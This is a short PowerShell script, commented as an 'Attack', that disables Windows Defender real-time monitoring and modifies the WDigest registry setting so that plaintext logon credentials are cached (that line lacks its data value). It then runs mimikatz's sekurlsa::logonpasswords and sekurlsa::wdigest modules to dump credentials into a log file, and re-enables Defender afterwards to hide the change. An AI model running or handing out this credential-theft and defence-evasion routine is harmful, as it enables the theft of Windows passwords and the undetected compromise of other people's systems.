<# Disable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $true

<# Attack #>
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d

. C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"

<# Enable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $false